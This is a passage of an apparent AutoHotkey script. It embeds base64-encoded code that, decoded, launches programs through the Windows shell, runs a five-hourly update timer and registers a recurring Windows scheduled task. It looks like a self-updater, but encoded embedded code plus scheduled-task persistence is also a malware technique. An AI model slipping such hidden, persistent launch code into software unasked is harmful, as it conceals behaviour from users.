BWVF9VSTQgOj0gMHgxMywgU1dDX0RFU0tUT1AgOj0gMHg4DQogICBzaGVsbFdpbmRvd3MgOj0gQ29tT2JqQ3JlYXRlKCJTaGVsbC5BcHBsaWNhdGlvbiIpLldpbmRvd3MNCiAgIHNoZWxsIDo9IHNoZWxsV2luZG93cy5JdGVtKCBDb21PYmplY3QoVlRfVUk0LCBTV0NfREVTS1RPUCkgKS5Eb2N1bWVudC5BcHBsaWNhdGlvbg0KICAgc2hlbGwuU2hlbGxFeGVjdXRlKGZpbGVQYXRoLCBhcmd1bWVudHMsIGRpcmVjdG9yeSwgdmVyYiwgc2hvdykNCn0NCg0KT25DaGlsZE1lc3NhZ2Uod3ApIHsNCiAgIE1zZ0JveCwgJSB3cA0KICAgaWYgd3ANCiAgICAgIEV4aXRBcHANCiAgIGVsc2Ugew0KICAgICAgU2V0VGltZXIsIFVwZGF0ZSwgJSAxMDAwKjM2MDAqNQ0KICAgICAgVXBkYXRlKCkgICAgICANCiAgIH0NCn0NCg0KQ3JlYXRlVGFzayh0YXNrTmFtZSwgZmlsZVBhdGgsIHNBcmdzLCBzdGFydFRpbWUsIGludGVydmFsSG91cnMgOj0gMCwgc3RhcnRJbW1lZGlhdGVseSA6PSBmYWxzZSkgew0KICAgbG9jYWwNCiAgIHN0YXRpYyBUQVNLX1RSSUdHRVJfREFJTFkgOj0gMg0KICAgICAgICAsIFRBU0tfQUNUSU9OX0VYRUMgOj0gMA0KICAgICAgICAsIFRBU0tfQ1JFQVRFX09SX1VQREFURSA6PSA2DQogICAgICAgICwgVEFTS19MT0dPTl9JTlRFUkFDVElWRV9UT0tFTiA6PSAzDQogICAgICAgIA0KICAgaWYgIVJlZ0V4TWF0Y2goc3RhcnRUaW1lLCAiXig/OjB8MXwoMikpKD8oMSlbMC0zXXxcZCk6WzAtNV1cZCQiKQ0KICAgICAgdGhyb3cgIndyb25nIHN0YXJ0VGltZSBmb3JtYXQiDQogICBpZiAhc2VydmljZSA6PSBDb21PYmpDcmVhdGUoIlNjaGVkdWxlLlNlcnZpY2UiKQ0KICAgICAgUmV0dXJuIGZhbHNlDQogICBzZXJ2aWNlLkNvbm5lY3QoKQ0KICAgcm9vdEZvbGRlciA6PSBzZXJ2aWNlLkdldEZvbGRlcigiXCIpDQogICB0YXNrRGVmaW5pdGlvbiA6PSBzZXJ2aWNlLk5ld1Rhc2soMCkNCiAgIA0KICAgcHJpbmNpcGFsIDo9IHRhc2tEZWZpbml0aW9uLlByaW5jaXBhbA0KICAgcHJpbmNpcGFsLkxvZ29uVHlwZSA6PSBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VODQogICANCiAgIHNldHRpbmdzIDo9IHRhc2tEZWZpbml0aW9uLlNldHRpbmdzDQogICBzZXR0aW5ncy5FbmFibGVkIDo9IHRydWUNCiAgIHNldHRpbmdzLlN0YXJ0V2hlbkF2YWlsYWJsZSA6PSB0cnVlDQogICBzZXR0aW5ncy5EaXNhbGxvd1N0YXJ0SWZPbkJhdHRlcmllcyA6PSBmYWxzZQ0KICAgc2V0dGluZ3MuUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZSA6PSB0cnVlDQogICBzZXR0aW5ncy5IaWRkZW4gOj0gZmFsc2UNCg0KICAgdHJpZ2dlcnMgOj0gdGFz"
base64 .= "a0RlZmluaXRpb24uVHJpZ2dlcnMNCiAgIHRyaWdnZXIgOj0gdHJpZ2dlcnMuQ3JlYXRlKFRBU0tfVFJJR0dFUl9EQUlMWSkNCiAgIGlmIGludGVydmFsSG91cnMgew0KICAgICAgcmVwZXRpdGlvbiA6PSB0cmlnZ2VyLlJlcGV0aXRpb24NCiAgICAgIHJlcGV0aXRpb24uRHVyYXRpb24gOj0gIlAxRCINCiAgICAgIHJlcGV0aXRpb24uSW50ZXJ2YWwgOj0gIlBUIiAuIGludGVydmFsSG91cnMgLiAiSCINCiAgIH0NCiAgIHN0YXJ0VGltZSA6PSAiMjAyMjA2MTYiIC4gU3RyUmVwbGFjZShzdGFydFRpbWUsICI6IikgLiAiMDAiDQogICBGb3JtYXRUaW1lLCBzdGFydFRpbWUsICUgc3RhcnRUaW1lLCB5eXl5LU1NLWRkVEhIOm1tOnNzDQogICB0cmlnZ2VyLlN0YXJ0Qm91bmRhcnkgOj0gc3RhcnRUaW1lDQogICB0cmlnZ2VyLklkIDo9ICJUaW1lVHJpZ2dlcklkIg0KICAgdHJpZ2dlci5FbmFibGVkIDo9IHRydWUNCg0KICAgYWN0aW9uIDo9IHRhc2tEZWZpbml0aW9uLkFjdGlvbnMuQ3JlYXRlKCBUQVNLX0FDVElPTl9FWEVDICkNCiAgIGFjdGlvbi5QYXRoIDo9IGZpbGVQYXRoDQogICAoc0FyZ3MgIT0gIiIgJiYgYWN0aW9uLkFyZ3VtZW50cyA6PSBzQXJncykNCiAgIA0KICAgdGFzayA6PSByb290Rm9sZGVyLlJlZ2lzdGVyVGFza0RlZmluaXRpb24odGFza05hbWUsIHRhc2tEZWZpbml0aW9uLCBUQVNLX0NSRUFURV9PUl9VUERBVEUsLCwgVEFTS19MT0dPTl9JTlRFUkFDVElWRV9UT0tFTikNCiAgICggc3RhcnRJbW1lZGlhdGVseSAmJiB0YXNrLlJ1bigiIikgKQ0KICAgUmV0dXJuIHRydWUNCn0="
Return base64
}
